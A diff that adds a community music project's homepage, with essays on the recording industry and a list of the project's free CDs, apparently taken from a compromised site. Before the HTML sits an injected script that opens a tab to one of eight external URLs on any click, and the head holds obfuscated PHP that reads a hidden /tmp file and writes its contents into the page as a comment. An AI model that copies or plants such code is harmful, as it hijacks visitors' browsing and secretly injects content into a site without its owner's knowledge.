@@ -1,0 +1,176 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+	<head>
+		<title>The Community Music Project</title>
+		<link href="cmp.css" rel="stylesheet" type="text/css">
+	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	<body>
+		<iframe id="nav" src="nav.html"></iframe>
+		
+		<h3>Genetic Diversity in Music</h3>
+		<p>
+			Lee Smith's novel, <u>Devil's Dream</u>, and Maggie Greenwald's movie, <u>Songcatcher</u>, 
+			chronicle a watershed in the history of American music.
+			<u>Devil's Dream</u>  begins with a poignant reminiscence of folks from a mountain community 
+			walking out to a high bald with a car radio and battery, to lie on blankets under a starry sky, 
+			and listen to The Grand Ole Opry.
+			Before this time, if they wanted music, they made it themselves.
+			After this time, they simply listened to recordings of the same music being played in Los Angeles supermarkets.
+		</p>
+		<p>
+			Old Timey, Blue Grass, Cajun, Tex-Mex, Rock-A-Billy, Delta Blues, Memphis Blues are just a few of 
+			the many forms of music that developed before commercial music reached into every corner of our 
+			country.
+			And when the recording industry needs inspiration to rescue itself from its own stale formulas, 
+			it reaches back into these corners, or into other areas of the world that have not yet been 
+			overwhelmed by American commercial music.
+		</p>
+		<p>
+			Money changes everything.
+			Some of the ways that money changes music are good.
+			For example, you can hear Rudolph Serkin play Beethoven piano sonatas or Dolly Parton sing blue 
+			grass or Samba Ngo play afro-pop for about $15 US;
+			as many times as you wish, wherever you are, and whenever you please.
+			On the other hand, if the music industry guesses that just a few thousand people will be 
+			interested in buying a certain type of music, they won't publish that music.
+		</p>
+		<p>
+			The recording industry continues to conglomerate into fewer but larger companies, 
+			companies that are typically run by executives who know more about marketing and 
+			accounting than they do about music.
+			Their business plan amounts to finding, and relentlessly promoting, 
+			the next Madonna, by gambling large on a small number of potential stars. 
+		</p>
+		<p>
+			Ironically, even though it has never been easier or cheaper to record and produce music CDs, 
+			the problem of reaching an audience is at least as hard as it has ever been.
+			Payola (bribes paid to radio stations) has been made illegal, but it still takes a lot of cash 
+			to encourage radio stations to play a particular song.
+			Commercial music promotion requires total commitment from the artist, a life of touring 
+			performances that is not family friendly.
+		</p>
+		<p>
+			The result is that many songwriters whose songs are at least as good as most of the hits, 
+			and many musicians that are at least as good as most of the stars, will not be heard.
+			Record label executives have replaced the royal patrons of Mozart's time.
+			Mozart died in poverty because he could not get a recording contract.
+			This is not a new problem.
+		</p>
+
+      <h3>We're Trying Something Different</h3>
+      <p>
+        The Community Music Project is a community of songwriters, musicians, and recording engineers publishing 
+		local music with minimal amounts of money.
+        Instead of complaining about, or attempting to change, the music recording industry, we offer an 
+		alternative for musicians and listeners.
+      </p>
+      <p>
+        The Community Music Project started with a geriatric tape recorder and a consumer microphone, 
+		graduated to MiniDisc, and then to a CD-R recorder.
+        We are currently recording in 16-track digital with conventional studio microphones.
+        As we were considering upgrading to more professional equipment, an angel sent a big check to the 
+		project that essentially covered the new equipment.
+        We do not have a studio.
+        Instead, we use our small living room, our son's former bedroom, and quiet spaces generously 
+		provided by supporters of the project. 
+      </p>
+      <p>
+        As of June 2007, the Community Music Project has published six CDs,
+          <a href="botw.html">Butterfly on the Wind (2000)</a>,
+          <a href="cst.html">Come Shining Through (2001)</a>,
+          <a href="ftl.html">Feel This Love (2002)</a>, 
+          <a href="dof.html">Dreams of Flying (2003)</a>,
+		  <a href="titc.html">The Innocence To Cry (2005)</a>, and
+		  <a href="waaot.html">We Are All of This (2007)</a>.
+        The Project has also assisted in the production of two other CDs, Goodbye Taganka (Jamuna, 2000) 
+		and I Send A Voice (Mark Smith &amp; Friends, 2002).
+        We are currently recording or planning many more CDs.
+      </p>
+      <p>
+        The local listening community supports the Project with donations of equipment, recording space, 
+		and small amounts of money.
+        "Local" is the Chapel Hill North Carolina area, home to several universities, and therefore 
+		now home to folks from everywhere.
+        Because we distribute our CDs free, and by hand, through our friends and friends-of-friends network, 
+		we achieve surprisingly wide distribution.
+      </p>
+
+	</body>
+</html>
